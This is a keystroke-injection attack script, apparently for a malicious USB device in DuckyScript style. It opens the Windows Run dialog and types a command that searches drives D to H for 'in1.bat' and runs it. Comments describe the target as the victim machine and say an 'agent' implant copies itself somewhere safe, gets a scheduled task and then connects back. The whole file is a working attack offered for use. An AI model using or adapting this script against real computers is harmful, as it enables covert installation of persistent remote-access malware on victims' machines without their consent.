REM To run this, you first need to create a disk image which contains the agent
REM Follow tools/README.md for instructions
REM Make sure the disk image is named agent.img you put it on the SD card

  REM Searches each drive for a file name in1.bat. Run it if found

  REM Note: If your payload needs some special chars, you might need to know the language pack of the victim machine.
  REM Support for language switching isn't complete but we can work around it by injecting raw keypresses
  REM RAW_HID SHIFT 0x64 as an example
  REM RAW_HID 0x64

  REM Open Run window
  GUI R
  DELAY 1000

  REM To run we tell the agent the VID and PID of this device. That way it knows exactly what device to talk to
  REM The interpreter injects some 'constants' like #_VID_ and #_PID_.
  REM This is to keep compatibility with DuckyScript3 but allows us to have dynamic variables we can use in our attack
  STRING cmd /c @echo off & for %d in (D E F G H) do if exist %d:
  RAW_HID 0x64
  STRING in1.bat %d:
  RAW_HID 0x64
  STRING in1.bat #_VID_ #_PID_

  REM Wait for the files to be copied to the right place and a task created
  WAIT_FOR_USB_STORAGE_ACTIVITY_TO_STOP
  DELAY 1000

  REM At this point the agent will copy itself somewhere safe and rerun itself
  REM we can wait until it connects
